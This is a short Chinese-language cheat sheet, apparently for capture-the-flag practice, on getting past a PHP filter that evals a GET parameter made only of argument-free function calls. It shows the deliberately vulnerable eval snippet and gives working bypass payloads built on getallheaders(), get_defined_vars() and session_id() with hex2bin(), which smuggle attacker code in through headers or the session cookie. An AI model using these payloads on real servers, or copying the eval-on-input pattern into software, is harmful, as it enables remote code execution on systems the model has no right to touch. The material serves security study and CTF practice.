
---
### 一般这样

```php
<?php 
if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp']){
eval($_GET['exp']); 
} ?>
```

### 常见绕过姿势

#### 1、getallheaders()
#### 获取请求头信息，返回数组

配合implode()---将数组转换成字符串

```
exp
?exp=eval(implode(getallheaders()));
```

#### 2、get_defined_vars()

##### 该函数的作用是获取所有的已定义变量，返回值也是数组。不过这个函数返回的是一个二维数组，所以不能与`implode`结合起来用。将`get_defined_vars()`的结果用`var_dump()`输出结果

用GET传入的参数会被显示在数组中的第一位，使用`current()`函数获取第一位，使用`end()`函数获取最后一个

#### 3、session_id()

`session_id()`可以用来获取/设置当前会话 ID。  
那么可以用这个函数来获取cookie中的`phpsessionid`了，并且这个值我们是可控的。  
但其有限制：
**文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - （减号）**

解决方法：将参数转化为16进制传进去，之后再用hex2bin()函数转换回来就可以了。

session_id必须要开启session才可以使用，所以我们要先使用session_start()

```
playload

?exp=eval(hex2bin(session_id(session_start())));
```